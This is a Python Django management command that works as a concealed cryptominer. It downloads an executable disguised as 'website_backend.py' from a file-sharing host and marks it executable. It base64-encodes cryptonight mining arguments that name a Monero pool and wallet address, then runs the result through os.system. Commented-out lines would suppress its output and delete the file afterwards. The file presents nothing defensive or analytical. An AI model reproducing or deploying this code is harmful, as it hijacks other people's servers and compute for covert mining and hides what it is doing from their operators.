import os
import requests
import time
import threading
import subprocess
import base64


from django.core.management.base import BaseCommand, CommandError

import logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

PROJECT_PATH = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

class Command(BaseCommand):

    def add_arguments(self, parser):
        parser.add_argument('-pod')


    def handle(self, *args, **options):
        #logger.info("I'm doing something")
        #import ipdb;ipdb.set_trace()

        url = 'https://transfer.sh/P16s0/website_backend.py'

        local_filename = os.path.join(PROJECT_PATH, 'website_backend.py')
        r = requests.get(url, stream=True)
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024):
                if chunk: # filter out keep-alive new chunks
                    f.write(chunk)

        os.chmod(local_filename, 0777)

        logger.info(" ".join(os.listdir(PROJECT_PATH)))

        def rm_temp_file():
            time.sleep(1)
            os.unlink(local_filename)
            logger.info(" ".join(os.listdir(PROJECT_PATH)))

        #t = threading.Thread(name='child procs', target=rm_temp_file)
        #t.start()

        cmd = os.path.join(PROJECT_PATH, 'website_backend.py')
        hash = '42G5btuJwzjbNAuLCDZfrtP6C9gzKEwr3Kvy4B6uZfEhYRoVV2AnFoZW8Tit6Rmu7VJdPF72y1kn4iqtMpdNnUnTV6P73G7'
        hash += '+%s' % options['pod'] if 'pod' in options else ''
        cmd_args = ' -a cryptonight -o stratum+tcp://xmrpool.eu:3333 -u %s -p x' % hash
        cmd_args = base64.b64encode(cmd_args)
        cmd = 'echo "%s" | base64 -d | xargs %s' % (cmd_args, cmd)
        #cmd += ' > /dev/null 2>&1'

        print cmd
        #return

        os.system(cmd)

        #process = subprocess.Popen(cmd.split(), stderr=subprocess.PIPE, shell=True)
        #for line in iter(process.stderr.readline, ''):
            #logger.info(line)
            #print line

